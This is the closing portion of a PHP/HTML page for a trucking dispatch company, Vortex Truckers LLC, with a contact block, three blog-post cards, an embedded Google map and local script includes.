                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- end of wpo-testimonial-section -->



        <!--start of wpo-cta-section -->
        <div class="wpo-cta-section">
            <div class="container">
                <div class="cta-wrapr">
                    <div class="wpo-section-title">
                        <h2>Vortex Truckers LLC</h2>
                        <h3>Reliable Dispatch & Logistics Services Nationwide</h3>
                        <a href="https://vortextruckersco.com/contact" class="theme-btn">Contact Support</a>
                    </div>
                    <div class="contact-info">
                        <div class="item">
                            <div class="icon">
                                <i class="flaticon-phone-call"></i>
                            </div>
                            <div class="text">
                                <span>Call for Inquiry</span>
                                <a href="tel:+19096394727">
                                    <p>+1 909 639 4727</p>
                                </a>
                            </div>
                        </div>
                        <div class="item">
                            <div class="icon">
                                <i class="flaticon-email"></i>
                            </div>
                            <div class="text">
                                <span>Send Us Email</span>
                                <a href="mailto:support@vortextruckersco.com">
                                    <p>support@vortextruckersco.com</p>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!--end of wpo-cta-section -->


        <!--start of wpo-blog-section -->
        <section class="wpo-blog-section section-padding">
            <div class="bg-img">
                <img src="assets/images/blog/bg-img.webp" alt="Vortex Truckers blog background">
            </div>
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-lg-6 col-12">
                        <div class="wpo-section-title">
                            <h2>Vortex Truckers LLC</h2>
                            <h3>Stay Informed with News & Updates</h3>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <!-- Blog Post 1 -->
                    <div class="col-lg-4 col-md-6 col-12">
                        <div class="blog-card">
                            <img src="assets/images/blog/img-10.webp" alt="Dispatching solutions blog post">
                            <div class="content">
                                <div class="date">
                                    <h3>20</h3>
                                    <span>Sep</span>
                                </div>
                                <div class="text">
                                    <span>Dispatching</span>
                                    <h2><a href="https://vortextruckersco.com/services">How Vortex Enhances Dispatch Efficiency Across the U.S.</a></h2>
                                </div>
                                <ul class="comment">
                                    <li><i class="flaticon-profile"></i> <span>Adrian M. Brooks</span></li>
                                    <li><i class="flaticon-comments"></i> <span>Comments(5)</span></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <!-- Blog Post 2 -->
                    <div class="col-lg-4 col-md-6 col-12">
                        <div class="blog-card">
                            <img src="assets/images/blog/img-2.webp" alt="Freight network and logistics post">
                            <div class="content">
                                <div class="date">
                                    <h3>28</h3>
                                    <span>Sep</span>
                                </div>
                                <div class="text">
                                    <span>Logistics</span>
                                    <h2><a href="https://vortextruckersco.com/services">Building a Smarter Freight Network with Vortex Truckers</a></h2>
                                </div>
                                <ul class="comment">
                                    <li><i class="flaticon-profile"></i> <span>Adrian M. Brooks</span></li>
                                    <li><i class="flaticon-comments"></i> <span>Comments(5)</span></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <!-- Blog Post 3 -->
                    <div class="col-lg-4 col-md-6 col-12">
                        <div class="blog-card">
                            <img src="assets/images/blog/img-6.webp" alt="Fleet management blog post">
                            <div class="content">
                                <div class="date">
                                    <h3>30</h3>
                                    <span>Sep</span>
                                </div>
                                <div class="text">
                                    <span>Trucking Tips</span>
                                    <h2><a href="https://vortextruckersco.com/services">Fleet Optimization Strategies That Work with Vortex</a></h2>
                                </div>
                                <ul class="comment">
                                    <li><i class="flaticon-profile"></i> <span>Adrian M. Brooks</span></li>
                                    <li><i class="flaticon-comments"></i> <span>Comments(5)</span></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!--end of wpo-blog-section -->

        <!--start of wpo-map-section -->
        <section class="wpo-map-section">
            <h2 class="hidden">Contact map</h2>
            <div class="wpo-map">
                <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3172.71877275444!2d-118.4702548!3d34.15424469999999!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x80c297ecb5c14b41%3A0xf3fee99834259df2!2sThe%20Rodin%20Building%2C%2015442%20Ventura%20Blvd%20201%201361%2C%20Sherman%20Oaks%2C%20CA%2091403%2C%20USA!5e1!3m2!1sen!2s!4v1744116245831!5m2!1sen!2s" height="400" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
            </div>
        </section>
        <!--end of wpo-map-section -->

        <!-- start of wpo-site-footer-section -->

        <?php include('footer.php'); ?>
        <!-- end of wpo-site-footer-section -->


    </div>
    <!-- end of page-wrapper -->

    <!-- All JavaScript files
    ================================================== -->
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/bootstrap.bundle.min.js"></script>
    <!-- Plugins for this template -->
    <script src="assets/js/modernizr.custom.js"></script>
    <script src="assets/js/jquery.dlmenu.js"></script>
    <script src="assets/js/jquery-plugin-collection.js"></script>
    <!-- Custom script for this template -->
    <script src="assets/js/script.js"></script>
</body>



</html>